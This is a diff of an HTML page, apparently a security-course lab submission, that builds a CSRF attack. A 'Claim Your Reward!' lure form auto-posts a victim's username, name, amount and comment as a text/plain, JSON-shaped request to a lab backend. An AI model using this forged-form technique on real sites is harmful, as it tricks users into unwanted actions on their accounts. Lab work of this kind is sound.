@@ -2,9 +2,10 @@
 <body>
   <h1>Claim Your Reward!</h1>
   <p>Please provide your details to proceed:</p>
-  <form action="https://cse543.aranjbar.me/backend/tfourtwo" method="POST" enctype="text/plain">
- 
-    <input type="hidden" id="username" name="username" value="ljl5837"><br><br>
+  
+  <form action="https://cse543.aranjbar.me/backend/tfourtwo" method="POST" enctype="text/plain" id="csrfForm">
+    <label for="username">Username:</label>
+    <input type="text" id="username" name="username" value="ljl5837"><br><br>
     
     <label for="fname">First Name:</label>
     <input type="text" id="fname" name="fname" value="lks"><br><br>
@@ -14,8 +15,33 @@
     
     <label for="comment">Comment:</label>
     <input type="text" id="comment" name="comment" value="what's your name"><br><br>
-    
-    <button type="submit">Submit</button>
+
+    <input type="hidden" id="jsonPayload" name="jsonPayload">
+    <button type="submit" onclick="prepareJsonPayload()">Submit</button>
   </form>
+
+  <script>
+    function prepareJsonPayload() {
+      // Collect form values
+      const username = document.getElementById('username').value;
+      const fname = document.getElementById('fname').value;
+      const amount = document.getElementById('amount').value;
+      const comment = document.getElementById('comment').value;
+
+      // Create JSON payload
+      const jsonPayload = JSON.stringify({
+        username: username,
+        fname: fname,
+        amount: amount,
+        comment: comment
+      });
+
+      // Assign JSON payload to hidden input
+      document.getElementById('jsonPayload').value = jsonPayload;
+
+      // Change form submission content-type
+      document.getElementById('csrfForm').setAttribute('enctype', 'text/plain');
+    }
+  </script>
 </body>
 </html>
